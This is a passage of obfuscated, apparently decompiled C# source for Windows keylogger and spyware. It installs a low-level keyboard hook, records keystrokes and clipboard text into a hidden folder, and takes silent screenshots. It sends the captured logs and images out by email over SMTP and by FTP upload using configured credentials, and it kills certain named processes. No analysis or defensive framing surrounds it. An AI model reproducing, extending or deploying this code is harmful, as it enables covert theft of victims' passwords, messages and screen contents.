        FileStream fileStream = new FileStream(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905), FileMode.Create, FileAccess.Write);
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
        if (Operators.CompareString(this.\u0002().Text, \u0003.\u0003.\u0001(333), false) == 0)
          streamWriter.WriteLine(this.\u0002 + \u0003.\u0003.\u0001(1978) + this.\u0003);
        else
          streamWriter.WriteLine(this.\u0002 + this.\u0002().Text + this.\u0003);
        streamWriter.Close();
        fileStream.Dispose();
        fileStream.Close();
        streamWriter.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToBoolean(this.\u0001[5]))
      {
        try
        {
          MailMessage message = new MailMessage();
          message.Subject = \u0002.\u0003.\u0002().Name + \u0003.\u0003.\u0001(2031);
          message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
          message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
          message.Body = Operators.CompareString(this.\u0002().Text, \u0003.\u0003.\u0001(333), false) != 0 ? this.\u0002 + this.\u0002().Text + this.\u0003 : this.\u0002 + \u0003.\u0003.\u0001(1978) + this.\u0003;
          message.IsBodyHtml = true;
          Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905));
          message.Attachments.Add(attachment);
          new SmtpClient(this.\u0001.\u0002(this.\u0001[3]))
          {
            Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4])),
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2])))
          }.Send(message);
          message.Dispose();
          attachment.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[7]))
      {
        try
        {
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(1935) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(1862) + this.\u0001.\u0002(this.\u0001[11]) + \u0003.\u0003.\u0001(1862) + str + \u0003.\u0003.\u0001(1905));
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[8]), this.\u0001.\u0002(this.\u0001[9]));
          ftpWebRequest.Method = \u0003.\u0003.\u0001(1944);
          byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905));
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(buffer, 0, buffer.Length);
          requestStream.Close();
          requestStream.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        this.\u0002().Clear();
        \u0002.\u0003.\u0002().Clipboard.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0004([In] object obj0, [In] EventArgs obj1)
    {
      string str = \u0003.\u0003.\u0001(2056) + \u0002.\u0003.\u0002().Name + DateTime.Now.ToString().Replace(\u0003.\u0003.\u0001(1862), \u0003.\u0003.\u0001(1867)).Replace(\u0003.\u0003.\u0001(1872), \u0003.\u0003.\u0001(1877)).Replace(\u0003.\u0003.\u0001(1882), \u0003.\u0003.\u0001(1867));
      if (!Directory.Exists(this.\u0001 + \u0003.\u0003.\u0001(1887)))
      {
        Directory.CreateDirectory(this.\u0001 + \u0003.\u0003.\u0001(1887));
        new DirectoryInfo(this.\u0001 + \u0003.\u0003.\u0001(1887)).Attributes = FileAttributes.Hidden;
      }
      try
      {
        this.Opacity = 0.0;
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);
        Graphics graphics = Graphics.FromImage((Image) bitmap);
        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
        bitmap.Save(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(2089));
        this.Opacity = 100.0;
        graphics.Dispose();
        bitmap.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToBoolean(this.\u0001[5]))
      {
        try
        {
          MailMessage message = new MailMessage();
          message.Subject = \u0003.\u0003.\u0001(2098) + \u0002.\u0003.\u0002().Name;
          message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
          message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
          message.Body = \u0003.\u0003.\u0001(2131) + \u0002.\u0003.\u0002().Name + \u0003.\u0003.\u0001(2156) + Conversions.ToString(\u0002.\u0003.\u0002().Clock.GmtTime);
          Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(2089));
          message.Attachments.Add(attachment);
          new SmtpClient(this.\u0001.\u0002(this.\u0001[3]))
          {
            Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4])),
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2])))
          }.Send(message);
          message.Dispose();
          attachment.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (!Conversions.ToBoolean(this.\u0001[7]))
        return;
      try
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(1935) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(1862) + this.\u0001.\u0002(this.\u0001[11]) + \u0003.\u0003.\u0001(1862) + str + \u0003.\u0003.\u0001(2089));
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[8]), this.\u0001.\u0002(this.\u0001[9]));
        ftpWebRequest.Method = \u0003.\u0003.\u0001(1944);
        byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(2089));
        Stream requestStream = ftpWebRequest.GetRequestStream();
        requestStream.Write(buffer, 0, buffer.Length);
        requestStream.Close();
        requestStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0005([In] object obj0, [In] EventArgs obj1)
    {
      try
      {
        if (Operators.CompareString(this.\u0012\u0002, \u0002.\u0003.\u0002().Clipboard.GetText(), false) == 0)
          return;
        this.\u0002().Text = this.\u0002().Text + \u0003.\u0003.\u0001(2173) + \u0002.\u0003.\u0002().Clipboard.GetText() + \u0003.\u0003.\u0001(2214);
        this.\u0012\u0002 = \u0002.\u0003.\u0002().Clipboard.GetText();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0006([In] object obj0, [In] EventArgs obj1)
    {
      try
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          string Left = Strings.LCase(processes[index].ProcessName);
          if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2239), false) == 0)
          {
            if (Conversions.ToBoolean(this.\u0001[51]))
              processes[index].Kill();
          }
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2252), false) == 0)
          {
            if (Conversions.ToBoolean(this.\u0001[53]))
              processes[index].Kill();
          }
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2265), false) == 0)
          {
            if (Conversions.ToBoolean(this.\u0001[54]))
              processes[index].Kill();
          }
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2278), false) == 0 && Conversions.ToBoolean(this.\u0001[52]))
            processes[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Conversions.ToBoolean(this.\u0001[50]))
        return;
      try
      {
        Process[] processes = Process.GetProcesses();
        int num = checked (processes.Length - 1);
        int index = 0;
        while (index <= num)
        {
          string Left = Strings.LCase(processes[index].ProcessName);
          if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2291), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2304), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2321), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2330), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2339), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2348), false) == 0)
            processes[index].Kill();
          else if (Operators.CompareString(Left, \u0003.\u0003.\u0001(2369), false) == 0)
            processes[index].Kill();
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0004()
    {
      if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.ModuleName)).Length <= 1)
        return;
      ProjectData.EndApp();
    }

    static \u0003() => \u0001.\u0002.\u0002();

    internal class \u0001
    {
      private static \u0003.\u0003.\u0001.\u0003 \u0001;
      private static \u0003.\u0003.\u0001.\u0004 \u0001;
      private static int \u0001;
      private static \u0003.\u0003.\u0001.\u0002 \u0001;

      [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002([In] int obj0, [In] \u0003.\u0003.\u0001.\u0002 obj1, [In] int obj2, [In] int obj3);

      [DllImport("user32", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002([In] int obj0, [In] int obj1, [In] int obj2, [In] \u0003.\u0003.\u0001.\u0001 obj3);

      [DllImport("user32", EntryPoint = "UnhookWindowsHookEx", CharSet = CharSet.Ansi, SetLastError = true)]
      private static extern int \u0002([In] int obj0);

      public \u0001()
      {
        \u0003.\u0003.\u0001.\u0001 = new \u0003.\u0003.\u0001.\u0002(\u0003.\u0003.\u0001.\u0002);
        \u0003.\u0003.\u0001.\u0001 = \u0003.\u0003.\u0001.\u0002(13, \u0003.\u0003.\u0001.\u0001, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
      }

      private static int \u0002([In] int obj0, [In] int obj1, [In] ref \u0003.\u0003.\u0001.\u0001 obj2)
      {
        if (obj0 == 0)
        {
          switch (obj1)
          {
            case 256:
            case 260:
              \u0003.\u0003.\u0001.\u0003 obj3 = \u0003.\u0003.\u0001.\u0001;
              if (obj3 != null)
              {
                obj3((Keys) obj2.\u0001);
                break;
              }
              break;
            case 257:
            case 261:
              \u0003.\u0003.\u0001.\u0004 obj4 = \u0003.\u0003.\u0001.\u0001;
              if (obj4 != null)
              {
                obj4((Keys) obj2.\u0001);
                break;
              }
              break;
          }
        }
        return \u0003.\u0003.\u0001.\u0002(\u0003.\u0003.\u0001.\u0001, obj0, obj1, obj2);
      }

      ~\u0001()
      {
        \u0003.\u0003.\u0001.\u0002(\u0003.\u0003.\u0001.\u0001);
        // ISSUE: explicit finalizer call
        base.Finalize();
      }

      private struct \u0001
      {
        public int \u0001;
        public int \u0002;
        public int \u0003;
        public int \u0004;
        public int \u0005;
      }

      private delegate int \u0002(int nCode, int wParam, ref \u0003.\u0003.\u0001.\u0001 lParam);

      internal delegate void \u0003(Keys Key);

      internal delegate void \u0004(Keys Key);
    }
  }
}
